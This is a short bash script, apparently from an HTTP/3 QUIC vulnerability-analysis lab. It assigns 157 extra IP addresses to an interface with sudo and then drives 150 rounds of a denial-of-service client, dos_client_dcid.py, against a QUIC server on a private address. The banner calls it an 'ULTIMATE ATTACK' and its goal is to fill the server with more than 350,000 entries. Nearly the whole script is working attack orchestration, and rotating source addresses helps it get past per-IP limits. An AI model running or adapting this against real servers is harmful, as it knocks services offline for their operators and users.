#!/bin/bash
source ~/http3-vulnerability-analysis/quic-env/bin/activate

SERVER_IP="172.16.20.123"
SERVER_PORT=4444
BASE_IP="172.16.0"

echo "========================================="
echo "ULTIMATE ATTACK - 150 Rounds"
echo "Target: 350,000+ entries"
echo "========================================="
echo ""

echo "Adding IP addresses 124-280..."
for i in {124..280}; do
    sudo ip addr add 172.16.0.${i}/24 dev ens18 2>/dev/null
done
echo "All IPs ready!"
echo ""

for round in {1..150}; do
    CLIENT_IP="${BASE_IP}.$((123 + round))"
    
    START_PORT=10000
    END_PORT=11000
    
    echo "Round $round/150 | IP: $CLIENT_IP"
    
    python3 dos_client_dcid.py \
        --host $SERVER_IP \
        --port $SERVER_PORT \
        --client-ip $CLIENT_IP \
        --start-port $START_PORT \
        --end-port $END_PORT 2>&1 | grep "Attack complete"
    
    sleep 0.1 #sleep 0.5
done

echo ""
echo "========================================="
echo "150 ROUNDS COMPLETE!"
echo "Expected: 350,000+ entries"
echo "========================================="
